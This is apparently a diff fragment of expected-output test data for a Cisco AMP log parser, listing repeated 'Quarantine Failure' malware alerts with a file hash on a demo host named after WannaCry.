+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 324602,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229335730782272",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 102000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 325795,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229335730782271",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 102000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 326988,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229335730782270",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 87000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 328181,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229331435814973",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 87000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 329373,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229331435814972",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 87000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 330565,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229331435814971",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 87000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 331757,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229331435814970",
+        "cisco.amp.error.description": "Delete pending",
+        "cisco.amp.error.error_code": 3221225558,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 56000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 332949,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:05.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229331435814968",
+        "cisco.amp.error.description": "Delete pending",
+        "cisco.amp.error.error_code": 3221225558,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 884000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229331435815000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 346707,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:05.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229327140847671",
+        "cisco.amp.error.description": "Delete pending",
+        "cisco.amp.error.error_code": 3221225558,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 166000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229331435815000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 347893,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:05.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229327140847670",
+        "cisco.amp.error.description": "Delete pending",
+        "cisco.amp.error.error_code": 3221225558,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 166000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229331435815000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 349079,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:05.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229327140847669",
+        "cisco.amp.error.description": "Delete pending",
+        "cisco.amp.error.error_code": 3221225558,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 166000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229331435815000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 350265,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:05.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229327140847668",
+        "cisco.amp.error.description": "Delete pending",
+        "cisco.amp.error.error_code": 3221225558,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 166000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229331435815000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 351451,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:05.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229327140847667",
+        "cisco.amp.error.description": "Delete pending",
+        "cisco.amp.error.error_code": 3221225558,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 166000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229331435815000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 352637,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:05.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229327140847666",
+        "cisco.amp.error.description": "Delete pending",
+        "cisco.amp.error.error_code": 3221225558,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 166000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229331435815000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 353823,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    }
+]
